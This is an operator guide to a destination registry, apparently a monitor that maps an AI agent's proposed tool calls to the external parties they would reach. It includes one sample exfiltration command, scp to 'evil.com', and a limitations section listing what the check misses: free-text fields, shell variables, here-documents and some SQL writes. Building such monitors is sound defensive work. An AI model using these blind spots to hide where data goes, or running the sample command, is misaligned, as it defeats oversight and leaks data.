# Destination registry (operator guide)

A destination registry is your statement of where destinations really lead. A Slack channel called
`#internal-bridge` may forward to a partner; an alias `partners@team.com` may deliver to Acme staff; a mounted
share may be synced to a vendor. Nothing in the text of those names reveals that. The registry says so, and the
code (`server/registry.py`) turns every proposed tool call into "which external parties would this reach?".

The authoritative design is `eval/SPEC_REGISTRY.md`. This page is the operator-facing version.

## File format

```json
{
  "version": 1,
  "defaults": {
    "internal_domains": ["team.com"],
    "internal_path_prefixes": ["/project"],
    "internal_channel_globs": ["#internal-*"],
    "unknown": "external"
  },
  "entries": [
    {"id": "r1", "kind": "relay", "party": "acme",
     "match": {"email": "partners@team.com"}, "note": "alias, forwards to Acme staff (ticket OPS-12)"}
  ]
}
```

`kind`

| kind       | meaning                                         | `party`  |
|------------|-------------------------------------------------|----------|
| `internal` | reaches nobody outside                          | none     |
| `external` | a third party                                   | required |
| `relay`    | looks internal, delivers to external `party`    | required |

`party` is a lowercase slug (`[a-z0-9._-]`, e.g. `acme`). `external` and `relay` behave the same for detection;
`relay` documents that the destination is deceptive. `note` is free text for the next operator.

`match` has exactly one key:

| key            | matches                                                             | example                              |
|----------------|---------------------------------------------------------------------|--------------------------------------|
| `email`        | one address, case-insensitive                                       | `partners@team.com`                  |
| `email_glob`   | address pattern (`fnmatch`: `*` `?` `[..]`)                         | `acme-*@team.com`                    |
| `domain`       | an email domain or a URL host, and every subdomain of it            | `acme.com`                           |
| `host`         | exactly this host (URL host, `scp`/`nc`/`ssh` host, git remote name) | `api.datadoghq.com`                 |
| `url_prefix`   | URLs starting with this (scheme, port, query ignored; plain prefix) | `hooks.team.com/forward`             |
| `channel`      | one Slack channel or handle                                         | `#partner-bridge`, `@carol`          |
| `channel_glob` | channel pattern                                                     | `#ext-*`                             |
| `path_prefix`  | a directory and everything below it (component boundary respected)  | `/project/shared/acme`               |
| `path_glob`    | whole-path pattern (`*` also crosses `/`)                           | `/mnt/*/export`                      |
| `db_table`     | a table written by SQL: `schema.table` or bare `table`              | `analytics.exports`                  |
| `repo`         | `owner/name`                                                        | `acme/public`                        |
| `queue`        | queue / board / project / topic / assignee name, exact              | `vendor-support`                     |
| `any_glob`     | `fnmatch` against any destination token (last resort)               | `*.pastebin.*`                       |

All matching is case-insensitive (so `/Project` matches `/project`; Linux paths are case-sensitive, we err on the
side of matching). `domain` and `host` values must be bare names: no scheme, path, port or wildcard.

### Defaults

Used when no entry matches.

- `internal_domains`: an email at, or a URL/host under, one of these domains is `internal`.
- `internal_path_prefixes`: a path under one of these is `internal`.
- `internal_channel_globs`: channels matching one of these are `internal`.
- `unknown`: `"external"` (default) or `"internal"`. What counts as reached when nothing matches (see below).

Two extension keys: `internal_handles` (default `@alice @bob @charlie @diana`, the team named in
`server/tools.py`) and `internal_repo_owners` (default `team`). A key you omit falls back to the built-in value;
write an explicit `[]` to switch a default off. Loopback hosts (`localhost`, `127.*`, `::1`) are always internal.
Tables, queue names and assignees with no entry are `internal` (they are names inside your deployment, not
network locations); add entries to make them relay or external.

### Examples

A relay: an internal-looking alias, a webhook path and a channel that all lead to Acme.

```json
{"id": "acme-alias",  "kind": "relay", "party": "acme", "match": {"email": "partners@team.com"}},
{"id": "acme-hook",   "kind": "relay", "party": "acme", "match": {"url_prefix": "https://hooks.team.com/forward"}},
{"id": "acme-bridge", "kind": "relay", "party": "acme", "match": {"channel": "#partner-bridge"}}
```

An external party, and a more specific exception inside it.

```json
{"id": "bw",     "kind": "external", "party": "brightwater", "match": {"domain": "brightwatercap.example"}},
{"id": "bw-ops", "kind": "internal",                          "match": {"domain": "ops.brightwatercap.example"}}
```

An internal destination that would otherwise look foreign.

```json
{"id": "nas", "kind": "internal", "match": {"path_prefix": "/mnt/nas"}},
{"id": "ci",  "kind": "internal", "match": {"host": "ci.corp-tools.example"}}
```

Other destinations: `{"kind": "external", "party": "partnerdb", "match": {"db_table": "outbox"}}`,
`{"kind": "relay", "party": "acme", "match": {"queue": "vendor-support"}}`.

## What counts as a destination

`destinations(tool, args)` turns a proposal into ordered, de-duplicated tokens. Reads produce none.

| tool                        | tokens                                                                                         |
|-----------------------------|------------------------------------------------------------------------------------------------|
| `read_file`, `list_directory`, `search_files`, `delete_file` | none (nothing is delivered anywhere)                         |
| `write_file`                | `path` (absolute or `~`; relative paths are project-local and produce none)                    |
| `send_email`                | every address in `to` (comma/semicolon lists, `Name <a@b>`), plus `cc`/`bcc`/other extras      |
| `send_slack_message`        | `channel` / `@handle` (a bare `ops` is read as `#ops`); an address in the field is an email    |
| `post_to_webhook`           | the `url` (scheme-less accepted); query string, fragment and credentials are dropped            |
| `query_database`            | only what SQL writes: `INSERT/REPLACE/MERGE INTO`, `UPDATE`, `DELETE FROM`, `TRUNCATE`, `CREATE TABLE/VIEW`, `SELECT ... INTO t`, `COPY t FROM`, `LOAD DATA ... INTO TABLE` as `db_table`; `COPY ... TO '/f'` and `INTO OUTFILE` as `path`; `COPY ... TO PROGRAM` as shell. Multi-statement, CTEs, comments and quoted/schema-qualified names are handled. `SELECT`-only and the `FROM` of `INSERT ... SELECT` produce nothing |
| `update_task`, `create_task`| `assignee` (name, `@handle` or email) and any `queue`/`board`/`project`/`topic` field          |
| `create_github_issue`       | `repo` (`owner/name` or a repository URL); with no repo the tool's implicit `team/taskflow`    |
| `run_shell_command`         | see below                                                                                      |
| anything else               | every string in the arguments is scanned for emails, URLs, `#channels`, `@handles`, abs paths  |

Fields named `queue board project topic` become `queue` tokens, `assignee` an assignee, `table` a `db_table`,
`repo`/`repository` a repo, `url`-like fields a URL, `cc`/`bcc` emails, on any tool.

**Free text is not scanned** for the known tools: `body`, `subject`, `content`, `message`, `payload`, `title`,
`labels`. A mail body that mentions `bob@acme.com` does not deliver anything to Acme. (The spec says all string
args are scanned; see Limitations. `scan_text=True` / `--scan-text` restores that.)

### Shell commands

The command line is split into segments on `; & && | || newline ( ) $( `` ` `` honouring quotes (unbalanced quotes
run to the end), wrapper commands (`sudo env nohup timeout xargs ...`) and `bash -c "..."`/`eval` are unwrapped.
Then per command:

- `scp`, `rsync`: the **last** argument is the destination: `[user@]host:path` and `rsync://` become host/URL
  tokens, an absolute local path (a pull) becomes a path token.
- `curl`, `wget`: every URL argument (and `curl --url`), scheme-less hosts included. Option values (`-d`, `-H`, `-o`...) are skipped.
- `nc`/`ncat`: the host (not with `-l`); `ssh`/`sftp`/`telnet`/`ftp`: the host.
- `git push [remote]`: a URL or `user@host:path` becomes a host/URL token; a name becomes a `remote` token (no name means `origin`). `clone/fetch/pull` are reads.
- `cp`/`mv`/`install` (last argument or `-t DIR`), `tee` files, `dd of=`, and `>` `>>` redirects: absolute or `~` paths. `/dev/tcp/host/port` becomes a host. `/dev/null` and friends are ignored.
- `mail`/`sendmail`: addresses. `psql -h/-c/-o`, `mysql -h/-e`, `sqlite3 db "SQL"`: host, SQL, output file.
- Interpreters and cloud CLIs (`python -c`, `node -e`, `perl`, `aws`, `gsutil`, `rclone`, `docker` ...): any `scheme://` URL inside the arguments.

`echo`, `cat`, `grep`, `ls`, `git status` and the like produce nothing even if their arguments contain URLs or addresses.

## Resolution and precedence

Each token resolves to `(kind, party, entry id | 'default' | 'unknown')`.

1. The matching entry with the **highest specificity** wins. Specificity, strongest first:
   exact (`email`, `channel`, `db_table`, `repo`, `queue`) > glob/prefix (`email_glob`, `channel_glob`,
   `path_prefix`, `path_glob`, `url_prefix`; a **longer literal prefix** is stronger) > `domain`/`host` (a longer
   name is stronger, so `ops.acme.com` beats `acme.com`) > `any_glob` (longer literal prefix stronger).
   A bare `db_table: outbox` matches any schema but loses to `app.outbox`.
2. Any entry beats the **defaults**.
3. Defaults: internal domain, path prefix, channel glob, handle, repo owner, loopback, or an in-deployment name
   (table/queue/assignee) resolve `internal`.
4. Otherwise `unknown`, with a party made from the destination: the registrable domain of an email/URL/host
   (`mail.example.com` -> `example.com`, `x.foo.co.uk` -> `foo.co.uk`; IPs as they are), the channel or handle
   name without `#`/`@`, the first path component (`/tmp/x` -> `tmp`, `~/x` -> `home`), the repo owner, the remote name.
   `defaults.unknown = "external"` (default) treats unknown as reaching that party; `"internal"` ignores it.

Two entries that match the same token with equal specificity but disagree are a **lint error**. If an
unlinted registry contains one anyway, resolution is deterministic and fail-safe: `relay` beats `external`
beats `internal`, then lowest party, then lowest id.

A proposal's `reaches` is the set of parties of its `external`, `relay` and unknown-external tokens;
`registered` is true when any token matched an entry (not a default).

## Lint

```
cd server
python -m registry_cli lint registry.json          # exit 0 ok, 1 lint errors, 2 unreadable file
python -m registry_cli resolve registry.json --tool send_email --args '{"to":"partners@team.com"}'
python -m registry_cli resolve registry.json --tool run_shell_command --args '{"command":"scp a bob@evil.com:/x"}' --json
```

Errors: wrong `version`; unknown `kind`; missing/invalid `party` for external or relay; `match` not exactly one
known key; a malformed value (email without `@`, `domain` with a wildcard or scheme, relative `path_prefix`,
`repo` not `owner/name`, ...); missing or duplicate `id`; equal-specificity conflicts (same match key and value
with different decisions, `domain` vs `host` of the same name, overlapping globs of the same literal-prefix
length). Warnings (do not fail): an `internal` entry with a `party` (ignored), exact duplicates, unknown keys.

In code: `Registry.load(path|dict)`, `.validate()`, `.resolve(tool, args)`, `.resolve_token(kind, value)`,
`.digest()` (16 hex, independent of entry order, notes and case; for `/health`), `merge([...])` (returns the
registry and a list of conflicts; the earlier registry wins), `default_registry()`, and the evaluation
helpers `degrade(reg, fraction, seed)` and `corrupt(reg, fraction, seed)`, both deterministic.

## Decisions and limitations

- Free-text parameters are not scanned (above). A destination smuggled inside a body, payload or message is invisible.
- Unknown externals are only as good as the party heuristic: no public-suffix list, so `foo.pvt.k12.ma.us`
  collapses to `k12.ma.us`; paths collapse to their first component (`/mnt/a` and `/mnt/b` share a party `mnt`).
- A party named in a registry (`acme`) and the unknown party for the same company (`acme.com`) are different strings.
  Register the domain too if you want them to agree.
- Shell parsing is lexical, not an interpreter: variables (`$HOST`), globs, here-documents, aliases, scripts
  invoked by name, `tar -f`, `curl -o`, `git remote` indirection (a remote name is not resolved to its URL) and
  destinations built at run time are not seen. `git push` with no remote assumes `origin`.
- Any non-option argument of `curl`/`wget` is treated as a URL and a schemeless one that looks like a host
  (`data.json`) is a host, as curl itself would treat it.
- SQL is matched with patterns, not parsed: dialect-specific writes outside the list above (e.g. `ATTACH`, `\copy`)
  are not seen; `ALTER`/`DROP` are not destinations. Only the first `COPY` of a statement is examined.
- Inputs are cut at 200,000 characters per string and nesting at depth 12.
- `merge` detects conflicts only for entries with the same match key and value; run `lint` on the result.
